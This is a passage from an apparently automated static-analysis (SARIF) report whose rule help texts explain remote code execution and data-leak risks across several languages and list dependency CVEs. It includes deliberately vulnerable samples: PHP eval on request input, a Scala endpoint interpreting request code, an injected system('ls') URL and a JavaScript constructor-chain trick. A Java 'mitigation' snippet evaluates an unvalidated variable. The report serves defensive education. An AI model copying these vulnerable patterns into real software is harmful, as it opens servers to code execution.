`eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**",
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include `eval()`, `system()`, `exec()`, `passthru()`, `shell_exec()`, and others.\n\nThis vulnerability arises when developers use these functions without properly validating or sanitizing user inputs. This can allow an attacker to inject and execute arbitrary code on the server.\n\nConsider the following PHP snippet, which takes a script input from an HTTP request and evaluates it:\n\n```php\n<?php\n$script = $_GET['script'];\n\n// Using the eval function directly on unsanitized input poses a severe security risk.\n// An attacker can provide a malicious PHP code as a value for the \"script\" parameter and execute it.\neval($script);\n\necho \"Script executed successfully!\";\n?>\n```\n\nBy visiting a URL like `http://example.com/vulnerable.php?script=system('ls');` an attacker could execute the `ls` command, and with more malicious intent, they can cause significant harm.\n\n## Mitigation\n\nTo secure your code, ensure that strings passed to evaluation or execution functions are from trusted sources, or are validated against an allow-list:\n\n```php\n<?php\n$allowedScripts = ['print_hello' => 'echo \"Hello, World!\";'];\n\n$scriptKey = $_GET['scriptKey'];\n\n// Validate against an allow-list of scripts.\nif (!array_key_exists($scriptKey, $allowedScripts)) {\n    die(\"Not permitted\");\n}\n\neval($allowedScripts[$scriptKey]);\n\necho \"Script executed successfully!\";\n?>\n```\n\n## Further Considerations\n\nDynamic code evaluation in PHP should be used with extreme caution. Whenever possible, avoid using functions like `eval()` altogether. If dynamic functionality is needed, consider more secure alternatives like creating pre-defined safe functions or adopting a Domain-Specific Language (DSL) with strict parsing and validation. Always use PHP's built-in functions to sanitize and validate all user inputs to prevent code injections.\n\n:::\n\n::::\n\n## CWEs\n\n**[CWE-77](https://cwe.mitre.org/data/definitions/77.html)**\n\n**[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**\n\n**[CWE-94](https://cwe.mitre.org/data/definitions/94.html)**\n\n**[CWE-917](https://cwe.mitre.org/data/definitions/917.html)**\n\n**[OWASP-A1](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
                            "id": "warning-sink-execute-code/a6ccbed8aed4756d11bfa11399570f03",
                            "name": "Remote Code Execution: Execution Of Non-Constant Code In Views.js:<Lambda>0.<Lambda>3",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8.5",
                                    "CWE 94",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a1-injection",
                                    "Remote Code Execution"
                                ]
                            },
                            "shortDescription": {
                                "text": "Remote Code Execution: Execution of Non-Constant Code in views.js:<lambda>0.<lambda>3"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "By default, the Express framework sends the HTTP header 'X-Powered-By: Express'."
                            },
                            "help": {
                                "markdown": "By default, the Express framework sends the HTTP header 'X-Powered-By: Express'.\n \n Attackers who know about the software stack in use can better target their attacks.\n ## Countermeasures\n - Add a call `app.disable('x-powered-by')` to your application.\n ## Additional information\n **[CWE-497](https://cwe.mitre.org/data/definitions/497.html)**\n **[OWASP-a6](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a6-Security_Misconfiguration)**",
                                "text": "By default, the Express framework sends the HTTP header 'X-Powered-By: Express'.\n \n Attackers who know about the software stack in use can better target their attacks.\n ## Countermeasures\n - Add a call `app.disable('x-powered-by')` to your application.\n ## Additional information\n **[CWE-497](https://cwe.mitre.org/data/definitions/497.html)**\n **[OWASP-a6](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a6-Security_Misconfiguration)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/497.html",
                            "id": "express-powered-by/7a7a7a2b239735faddbd9d180662b6d4",
                            "name": "Fingerprinting: Exposure Of Software Stack In X-Powered-By Http Header In Server.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "1",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 1",
                                    "CWE 497",
                                    "Fingerprinting",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a6-security-misconfiguration"
                                ]
                            },
                            "shortDescription": {
                                "text": "Fingerprinting: Exposure of Software Stack in X-Powered-By HTTP Header in server.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "axios is vulnerable to Inefficient Regular Expression Complexity."
                            },
                            "help": {
                                "markdown": "axios is vulnerable to Inefficient Regular Expression Complexity",
                                "text": "axios is vulnerable to Inefficient Regular Expression Complexity"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/07330a215b32027e5b0ade96b693fe92",
                            "name": "Pkg:npm/Axios@0.19.0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2021-3749",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 1333",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/axios@0.19.0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/259.html",
                            "id": "hardcoded-credentials/96ed770a28f793bd573308ba7ef683ed",
                            "name": "Hardcoded Credentials: Hardcoded Credentials Used In Authentication Or Encryption Operation In Order.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "3",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 3",
                                    "CWE 259",
                                    "CWE 798",
                                    "Hardcoded Credentials",
                                    "OWASP 2021 a07-identification-and-authentication-failures",
                                    "OWASP a07-2021-identification-and-authentication-failures",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Order.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Prototype pollution attack when using `_.zipObjectDeep` in lodash."
                            },
                            "help": {
                                "markdown": "Prototype pollution attack when using `_.zipObjectDeep` in lodash.",
                                "text": "Prototype pollution attack when using `_.zipObjectDeep` in lodash."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/a85b4190a628b305b807216f9342b4e5",
                            "name": "Pkg:npm/Lodash@4.17.15",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.4",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2020-8203",
                                    "CVSS 7.4",
                                    "CWE 1035",
                                    "CWE 1321",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/lodash@4.17.15"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend."
                            },
                            "help": {
                                "markdown": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.",
                                "text": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/74.html",
                            "id": "oss_vuln/a97c344bf45005696c30140c3031d314",
                            "name": "Pkg:npm/Pug-Code-Gen@2.0.2",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2021-21353",
                                    "CVSS 9",
                                    "CWE 1035",
                                    "CWE 74",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/pug-code-gen@2.0.2"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be 